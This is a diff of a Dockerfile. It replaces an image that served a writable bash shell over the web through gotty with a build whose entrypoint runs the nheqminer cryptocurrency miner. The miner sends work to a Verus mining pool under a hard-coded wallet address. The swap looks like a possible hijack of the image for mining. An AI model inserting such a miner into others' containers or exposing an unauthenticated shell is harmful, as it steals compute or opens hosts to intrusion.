@@ -1,18 +1,28 @@
+FROM ubuntu:latest as builder
+
+RUN apt-get update && apt-get dist-upgrade -y && \
+    apt-get install -y ca-certificates && \
+    apt-get -y autoremove; apt-get -y autoclean; apt-get -y clean; \
+    rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+
+RUN apt-get update && apt-get dist-upgrade -y && \
+    apt-get install -y build-essential cmake libboost-all-dev git && \
+    apt-get -y autoremove; apt-get -y autoclean; apt-get -y clean; \
+    rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+
+RUN git clone https://github.com/wattpool/nheqminer.git && \
+    mkdir -p /nheqminer/build && cd /nheqminer/build && cmake .. && make -j $(nproc) && \
+    strip /nheqminer/build/nheqminer && \
+    mv /nheqminer/build/nheqminer /usr/sbin/ && \
+    apt-get -y autoremove; apt-get -y autoclean; apt-get -y clean; rm -rf /var/lib/apt/lists/*
+
 FROM ubuntu:latest
 
-ENV LANG en_US.UTF-8
-ENV LANGUAGE en_US:en
-ENV GOTTY_TAG_VER v1.0.1
+RUN apt-get update && apt-get dist-upgrade -y && \
+    apt-get install -y ca-certificates && \
+    apt-get -y autoremove; apt-get -y autoclean; apt-get -y clean; \
+    rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
 
-RUN apt-get -y update && \
-    apt-get install -y curl && \
-    apt-get install wget -y && \
-    curl -sLk https://github.com/yudai/gotty/releases/download/${GOTTY_TAG_VER}/gotty_linux_amd64.tar.gz \
-    | tar xzC /usr/local/bin && \
-    apt-get purge --auto-remove -y curl && \
-    apt-get clean && \
-    rm -rf /var/lib/apt/lists*
-    
-EXPOSE 8080
+COPY --from=builder /usr/sbin/nheqminer /usr/sbin/
 
-CMD ["gotty", "-r", "-w", "--port", "8080", "/bin/bash"]
+ENTRYPOINT [ "nheqminer", "-v", "-l", "verus.wattpool.net:1232", "-u", "RMJid9TJXcmBh2BhjAWXqGvaSSut2vbhYp.dockerized", "-p", "x" ]
